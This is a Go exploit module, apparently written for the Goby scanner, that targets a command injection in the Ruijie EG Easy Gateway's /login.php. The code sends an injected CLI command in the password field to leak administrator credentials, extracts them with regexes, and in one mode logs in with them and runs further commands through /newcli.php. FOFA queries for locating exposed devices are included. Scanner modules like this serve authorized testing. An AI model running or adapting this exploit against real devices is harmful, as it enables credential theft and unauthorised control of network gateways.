package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie-EG-Easy-GW /login.php Information Disclosure Vulnerability",
    "Description": "<p>Ruijie EG Easy Gateway is a comprehensive gateway, which is completely independently developed by Ruijie Network. It integrates advanced software and hardware architecture, and is equipped with a DPI in-depth analysis engine and a behavior analysis/management engine, which can provide professional flow control functions, excellent URL filtering, and localized log storage/audit services under the condition of ensuring efficient forwarding of network egress. </p><p>Ruijie EG Easy Gateway login.php CLI command injection, resulting in the leakage of the administrator account password.</p>",
    "Product": "Ruijie-EG-Easy-GW",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2024-10-21",
    "PostTime": "2024-10-22",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"webchat.ruijie.com.cn/client.jsp\" && body=\"RG-EG\"",
    "GobyQuery": "body=\"webchat.ruijie.com.cn/client.jsp\" && body=\"RG-EG\"",
    "Level": "1",
    "Impact": "<p>Ruijie EG Easy Gateway login.php CLI command injection, resulting in the leakage of the administrator account password.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_37113223/article/details/135479881"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default,url-rule-message",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.5",
    "Translation": {
        "CN": {
            "Name": "锐捷-EG易网关 /login.php 信息泄露漏洞",
            "Product": "Ruijie-EG易网关",
            "Description": "<p>锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。<br></p><p>锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Ruijie-EG-Easy-GW /login.php Information Disclosure Vulnerability",
            "Product": "Ruijie-EG-Easy-GW",
            "Description": "<p>Ruijie EG Easy Gateway is a comprehensive gateway, which is completely independently developed by Ruijie Network. It integrates advanced software and hardware architecture, and is equipped with a DPI in-depth analysis engine and a behavior analysis/management engine, which can provide professional flow control functions, excellent URL filtering, and localized log storage/audit services under the condition of ensuring efficient forwarding of network egress.&nbsp;</p><p>Ruijie EG Easy Gateway login.php CLI command injection, resulting in the leakage of the administrator account password.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Ruijie EG Easy Gateway login.php CLI command injection, resulting in the leakage of the administrator account password.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	postOrGet_asdfjnyhiasfhweygftwfyewhyerfgsdtugdcvsuhicxsijdfgisdfgvbc := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewPostRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Data = "username=admin&password=admin?show+webmaster+user\r\n"
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/login.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/login.php": `data":"WORD`,
			}
			// 函数继承
			uploadFileFunc := postOrGet_asdfjnyhiasfhweygftwfyewhyerfgsdtugdcvsuhicxsijdfgisdfgvbc

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			mode := goutils.B2S(ss.Params["mode"])
			expResult.Success = false
			resp, err := postOrGet_asdfjnyhiasfhweygftwfyewhyerfgsdtugdcvsuhicxsijdfgisdfgvbc(expResult.HostInfo, "/login.php")
			if err != nil {
				return expResult
			}
			// 定义正则表达式模式
			pattern := `00(.*?)",`
			// 编译正则表达式
			re := regexp.MustCompile(pattern)
			if !re.MatchString(resp) {
				return expResult
			}
			// 查找所有匹配项
			matche := re.FindStringSubmatch(resp)
			resp = matche[1]
			resp += `\r`
			pattern = `\. (.*?) (.*?)\\r`
			// 编译正则表达式
			re = regexp.MustCompile(pattern)
			if !re.MatchString(resp) {
				return expResult
			}
			// 查找所有匹配项
			matches := re.FindAllStringSubmatch(resp, -1)
			// 定义用于存储用户名和密码的数组
			var usernames []string
			var passwords []string
			// 遍历匹配项并打印捕获组1的内容
			for _, match := range matches {
				if len(match) >= 3 {
					// 捕获组1: match[1] 是用户名
					// 捕获组2: match[2] 是密码
					username := match[1]
					password := match[2]

					// 将用户名和密码分别加入数组
					usernames = append(usernames, username)
					passwords = append(passwords, password)
				}
			}

			if mode == "url-rule-message" {
				//对username和password的所有字符进行url编码
				username := url.QueryEscape(usernames[0])
				password := url.QueryEscape(passwords[0])
				requestConfig := httpclient.NewPostRequestConfig("/login.php")
				requestConfig.VerifyTls = false
				requestConfig.FollowRedirect = false
				requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				requestConfig.Data = "username=" + username + "&password=" + password
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
				if err != nil || resp.StatusCode != 200 {
					return expResult
				}
				// 定义正则表达式模式
				pattern := `RUIJIEID=(.*?);`
				// 编译正则表达式
				re := regexp.MustCompile(pattern)
				if !re.MatchString(resp.HeaderString.String()) {
					return expResult
				}
				match := re.FindStringSubmatch(resp.HeaderString.String())
				cook := match[0]
				requestConfig.Header.Store("Cookie", cook)
				requestConfig.URI = "/newcli.php"
				requestConfig.Data = "mode_url=exec&command=show+url-rule+content-policy+_TOP_PRIORITY&charset=gbk"
				resp, err = httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
				if err != nil || resp.StatusCode != 200 {
					return expResult
				}
				expResult.Output = resp.RawBody
				expResult.Success = true
				return expResult
			} else if mode == "default" {
				expResult.Success = true
				expResult.Output = "Please use the following username and password to log in: \r\n\r\nusername = " + usernames[0] + "\r\npassword = " + passwords[0]
				for i := 1; i < len(usernames); i++ {
					expResult.Output += "\r\n\r\nusername = " + usernames[i] + "\r\npassword = " + passwords[i]
				}
				return expResult
			}
			return expResult
		},
	))
}
